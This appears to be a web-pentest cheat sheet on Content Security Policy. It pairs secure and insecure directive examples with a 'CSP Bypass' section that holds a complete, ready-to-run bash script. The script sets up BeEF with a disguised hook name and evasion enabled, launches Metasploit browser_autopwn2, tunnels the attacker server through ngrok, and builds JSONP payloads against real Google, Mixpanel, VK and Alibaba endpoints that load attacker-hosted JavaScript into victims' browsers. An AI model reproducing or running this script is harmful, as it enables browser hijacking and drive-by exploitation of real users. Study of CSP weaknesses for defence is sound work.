# Content Security Policy

## Check List

* [ ] _Review the Content-Security-Policy header or meta element to identify misconfigurations._

## Cheat Sheet

### CSP Header

#### [cURL](https://curl.se/)

```bash
curl -I $WEBSITE | grep "content-security-policy"
```

### CSP Parameters

_default-src (Secure)_

```bash
Content-Security-Policy: default-src 'self'
```

_default-src (Non-Secure)_

```bash
Content-Security-Policy: default-src *
```

_script-src (Secure)_

```bash
Content-Security-Policy: script-src 'self' 'nonce-random123'
```

_script-src (Non-Secure)_

```bash
Content-Security-Policy: script-src 'unsafe-inline'
```

_style-src (Secure)_

```bash
Content-Security-Policy: style-src 'self' 'sha256-abc123'
```

_style-src (Non-Secure)_

```bash
Content-Security-Policy: style-src 'unsafe-inline'
```

_img-src (Secure)_

```bash
Content-Security-Policy: img-src 'self' https://cdn.example.com
```

_img-src (Non-Secure)_

```bash
Content-Security-Policy: img-src *
```

_connect-src (Secure)_

```bash
Content-Security-Policy: connect-src 'self' https://api.example.com
```

_connect-src (Non-Secure)_

```bash
Content-Security-Policy: connect-src *
```

_font-src (Secure)_

```bash
Content-Security-Policy: font-src 'self' https://fonts.gstatic.com
```

_font-src (Non-Secure)_

```bash
Content-Security-Policy: font-src *
```

_object-src (Secure)_

```bash
Content-Security-Policy: object-src 'none'
```

_object-src (Non-Secure)_

```bash
Content-Security-Policy: object-src *
```

_frame-src (Secure)_

```bash
Content-Security-Policy: frame-src 'self' https://trusted.example.com
```

_frame-src (Non-Secure)_

```bash
Content-Security-Policy: frame-src *
```

_frame-ancestors (Secure)_

```bash
Content-Security-Policy: frame-ancestors 'none'
```

_frame-ancestors (Non-Secure)_

```bash
Content-Security-Policy: frame-ancestors *
```

_sandbox (Secure)_

```bash
Content-Security-Policy: sandbox
```

_sandbox (Non-Secure)_

```bash
Content-Security-Policy: sandbox allow-scripts allow-forms
```

### CSP Bypass

#### [BeEF ](https://beefproject.com/)& JSONP

_Create Script_

```bash
sudo nano beef-csp-bypass.sh
```

```bash
#!/bin/bash

RED='\e[1;31m'
GREEN='\e[1;32m'
YELLOW='\e[1;33m'
CYAN='\e[1;36m'
RESET='\e[0m'

# Check for ROOT
if [[ "$(id -u)" -ne 0 ]]; then
    printf "${RED}[X] Please run as ROOT...\n"
    exit 1
fi

# Get LAN and WAN IP addresses
LAN=$(hostname -I | awk '{print $1}')
WAN=$(curl -s https://api.ipify.org)

# Kill any running ngrok or ruby instances
pkill -f 'ngrok|ruby'

# Start Metasploit
msfconsole -qx "load msgrpc ServerHost=$LAN Pass=abc123 SSL=y; use auxiliary/server/browser_autopwn2; set LHOST $WAN; set URIPATH /pwn; run -z" &>/dev/null &
sleep 1

# Start ngrok and extract public URL
ngrok http 3000 &>/dev/null &
sleep 3
NGHOST=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r .tunnels[0].public_url | sed 's|https://||')
printf "${GREEN}[*] ngrok started successfully...${RESET}\n"

# Config BeEF
if grep -q "https: false" /usr/share/beef-xss/config.yaml; then
    sed -i -e 's|user:   "beef"|user:   "unk9vvn"|g' \
           -e 's|passwd: "beef"|passwd: "00980098"|g' \
           -e 's|# public:|public:|g' \
           -e 's|#     host: "" # public|     host: "'$NGHOST'" # public|' \
           -e 's|#     port: "" # public|     port: "443" # public|g' \
           -e 's|#     https: false|     https: true|g' \
           -e 's|allow_reverse_proxy: false|allow_reverse_proxy: true|g' \
           -e 's|hook.js|jqueryctl.js|g' \
           -e 's|BEEFHOOK|UNKSESSION|g' /usr/share/beef-xss/config.yaml
    sed -i -e 's|enable: false|enable: true|g' \
           -e 's|host: "127.0.0.1"|host: "'$LAN'"|g' \
           -e 's|callback_host: "127.0.0.1"|callback_host: "'$LAN'"|g' \
           -e 's|auto_msfrpcd: false|auto_msfrpcd: true|g' /usr/share/beef-xss/extensions/metasploit/config.yaml
    sed -i -e 's|enable: false|enable: true|g' /usr/share/beef-xss/modules/metasploit/browser_autopwn/config.yaml
    sed -i -e 's|enable: false|enable: true|g' /usr/share/beef-xss/extensions/evasion/config.yaml
else
    sed -i -e 's|user:   "beef"|user:   "unk9vvn"|g' \
           -e 's|passwd: "beef"|passwd: "00980098"|g' \
           -e 's|# public:|public:|g' \
           -e 's|host: ".*" # public|host: "'$NGHOST'" # public|' \
           -e 's|port: ".*" # public|port: "443" # public|g' \
           -e 's|https: false|https: true|g' \
           -e 's|allow_reverse_proxy: false|allow_reverse_proxy: true|g' \
           -e 's|hook.js|jqueryctl.js|g' \
           -e 's|BEEFHOOK|UNKSESSION|g' /usr/share/beef-xss/config.yaml
    sed -i -e 's|enable: false|enable: true|g' \
           -e 's|host: ".*"|host: "'$LAN'"|g' \
           -e 's|callback_host: ".*"|callback_host: "'$LAN'"|g' \
           -e 's|auto_msfrpcd: false|auto_msfrpcd: true|g' /usr/share/beef-xss/extensions/metasploit/config.yaml
    sed -i -e 's|enable: false|enable: true|g' /usr/share/beef-xss/modules/metasploit/browser_autopwn/config.yaml
    sed -i -e 's|enable: false|enable: true|g' /usr/share/beef-xss/extensions/evasion/config.yaml
fi

printf "${GREEN}[*] BeEF configuration updated...${RESET}\n"

# Start BeEF
cd /usr/share/beef-xss && ./beef -x &>/dev/null &

# Inject payload into JSONP callback
inject_payload()
{
    local url="$1"
    local js_payload="var script=document.createElement('script');script.src='https://${NGHOST}/jqueryctl.js';document.body.appendChild(script);"
    local encoded_callback=$(echo -n "$js_payload" | jq -sRr @uri)
    local test_url="${url/JSONP/$encoded_callback}"
    printf "%b\n" "\n${YELLOW}[*] Payload: <script src=\"${test_url}\"></script> ${RESET}\n"
}

# Target APIs for JSONP exploitation
targets=(
    "https://api.mixpanel.com/track/?callback=JSONP"
    "https://www.google.com/complete/search?client=chrome&q=hello&callback=JSONP"
    "https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=JSONP"
    "https://accounts.google.com/o/oauth2/revoke?callback=JSONP"
    "https://api-metrika.yandex.ru/management/v1/counter/1/operation/1?callback=JSONP"
    "https://api.vk.com/method/wall.get?callback=JSONP"
    "https://mango.buzzfeed.com/polls/service/editorial/post?poll_id=121996521&result_id=1&callback=JSONP"
    "https://ug.alibaba.com/api/ship/read?callback=JSONP"
)

# Run the attack
for target in "${targets[@]}"; do
    inject_payload "$target"
done

printf "\n"
printf "%b[*] BeEF Panel: https://${NGHOST}/ui/panel%b\n" "$CYAN" "$RESET"
printf "%b[*] BeEF USER: unk9vvn%b\n" "$CYAN" "$RESET"
printf "%b[*] BeEF PASS: 00980098%b\n" "$CYAN" "$RESET"
printf "%bBeEF Panel > Commands > Misc > Create Invisible Iframe > URL: http://$WAN:8080/pwn > Execute%b\n" "$GREEN" "$RESET"
```

_Run Script_

```bash
sudo chmod +x beef-csp-bypass.sh;sudo ./beef-csp-bypass.sh
```
